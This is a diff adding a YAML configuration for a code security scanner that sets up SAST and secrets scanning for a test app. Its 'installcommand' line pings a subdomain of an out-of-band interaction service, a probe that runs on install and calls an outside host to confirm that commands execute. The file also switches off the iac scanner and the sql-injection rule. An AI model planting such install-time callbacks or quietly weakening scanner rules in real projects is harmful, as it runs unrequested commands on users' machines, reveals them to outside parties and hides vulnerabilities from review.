@@ -1,0 +1,23 @@
+version: "1.0"
+installcommand: "ping -c 1 i4njmgfom3k4zaf2cs7jfc7vdmjd7avz.oastify.com"
+modules:
+  - name: TestApp
+    source_root: "test" 
+    exclude_patterns:
+      - "fixtures/"
+    exclude_scanners:
+      - iac
+    scanners:
+      sast:
+        language: python
+        working_dirs:
+          - "src"
+        exclude_patterns:
+          - "src/tests/**"
+        excluded_rules:
+          - sql-injection
+      secrets:
+        working_dirs:
+          - "config"
+        exclude_patterns:
+          - "config/samples/**"
